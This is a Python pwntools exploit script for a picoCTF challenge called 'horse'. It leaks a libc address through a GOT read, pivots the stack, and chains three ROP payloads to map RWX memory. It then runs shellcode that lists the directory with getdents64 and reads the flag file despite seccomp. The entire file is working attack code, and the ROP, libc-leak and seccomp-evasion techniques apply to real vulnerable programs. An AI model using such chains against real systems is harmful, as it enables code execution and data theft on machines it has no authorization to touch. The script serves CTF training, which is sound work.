from pwn import *

context.arch = 'amd64'

if args['REMOTE']:
    r = remote('mars.picoctf.net', 31809)
elif args['LOCAL']:
    r = remote('127.0.0.1', 5000)
else:
    # Patched horse with patchelf
    r = process('./horse', env={"LD_PRELOAD": "./libc-2.31.so"})


log.info("Send first ROP for libc leak")
rop1 = b'A' * 0x20
rop1 += p64(0x602800)  # new rbp for second run

# Desperate way to set rdx, since no good gadgets in binary
# Later learned about ret2csu
rop1 += p64(0x400c03)  # pop rdi ; ret
rop1 += p64(0x601000)
rop1 += p64(0x400760)  # strlen, rdx get set as side effect to rdi

rop1 += p64(0x400c03)  # pop rdi ; ret
rop1 += p64(1)
rop1 += p64(0x400c01)  # pop rsi ; pop r15 ; ret
rop1 += p64(0x601f98)  # GOT
rop1 += p64(0xdeadbeef)
rop1 += p64(0x400740)  # write
rop1 += p64(0x4005a8)  # ret for stack aligment
rop1 += p64(0x400b6f)  # restart main, but after seccomp setup
while len(rop1) < 0x80:
    rop1 += p64(0xdeadbeef)  # ret

assert(len(rop1) == 0x80)

pause()
r.send(rop1)

r.recvuntil(b'\xc2\xb4\n')  # horse ascii
leak = r.recv()
free = u64(leak[:8])
log.info(f"free @ 0x{free:x}")
libc = free - 0x9d850
log.info(f"libc @ 0x{libc:x}")

log.info("Send second ROP for receiving third ROP")
# main restarts (after seccomp setup), with a clobbered $rbp.
# It will read in 0x80 bytes at 0x602800-0x20, stack pivot
# and return to the ROP chain at 0x602808. This means we have
# 0x58 bytes of ROP that we will use to read in more bytes right after
# the initial ROP, to extend it.
rop2 = b'A' * 0x20
rop2 += p64(0xdeadbeef)  # new rbp
rop2 += p64(libc + 0x26b72)  # pop rdi ; ret
rop2 += p64(0)
rop2 += p64(libc + 0x27529)  # pop rsi ; ret
rop2 += p64(0x602800 - 0x20 + 0x80)  # end of rop2
rop2 += p64(libc + 0x11c371)  # pop rdx ; pop r12 ; ret
rop3_length = 0x100
rop2 += p64(rop3_length)
rop2 += p64(0xdeadbeef)
rop2 += p64(0x400790)  # read
while len(rop2) < 0x80:
    rop2 += p64(0x4005a8)

assert(len(rop2) == 0x80)

r.send(rop2)
r.recvuntil(b'\xc2\xb4\n')  # horse ascii

# We can now send longer ROP. We'll do a mmap -> read -> ret2sc
log.info("Send third ROP to mmap RWX, read and jump to shellcode")

sc_addr = 0x10000000

# mmap
rop3 = p64(libc + 0x26b72)  # pop rdi ; ret
rop3 += p64(sc_addr)
rop3 += p64(libc + 0x27529)  # pop rsi ; ret
rop3 += p64(0x1000)
rop3 += p64(libc + 0x1056fd)  # pop rdx ; pop rcx ; pop rbx ; ret
rop3 += p64(7)
rop3 += p64(0x32)  # MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED
rop3 += p64(0xdeadbeef)
rop3 += p64(libc + 0x49dfd)  # xor r8d, r8d ; mov rax, r8 ; ret
rop3 += p64(libc + 0xc9ccf)  # xor r9d, r9d ; mov eax, r9d ; ret
rop3 += p64(libc + 0x11ba20)  # mmap
# read
rop3 += p64(libc + 0x26b72)  # pop rdi ; ret
rop3 += p64(0)
rop3 += p64(libc + 0x27529)  # pop rsi ; ret
rop3 += p64(sc_addr)
rop3 += p64(libc + 0x11c371)  # pop rdx ; pop r12 ; ret
rop3 += p64(0x1000)
rop3 += p64(0xdeadbeef)
rop3 += p64(0x400790)  # read
# jump to shellcode
rop3 += p64(sc_addr)
while len(rop3) < rop3_length:
    rop3 += p64(0xdeadbeef)

assert(len(rop3) == rop3_length)

r.send(rop3)

log.info("Send shellcode")
sc = shellcraft.open('.')
sc += shellcraft.amd64.linux.syscall('SYS_getdents64', 3, 0x602800, 0x800)
sc += shellcraft.amd64.linux.syscall('SYS_open', 0x60285b, 0, 'O_RDONLY')
sc += shellcraft.amd64.linux.syscall('SYS_mmap', 0, 0x1000, 'PROT_READ', 'MAP_PRIVATE', 'rax', 0)
sc += shellcraft.amd64.linux.syscall('SYS_write', 1, 'rax', 0x100)
r.send(asm(sc))

flag = r.recvuntil(b'\0')[:-1]
log.info(f"Flag: {flag.decode()}")
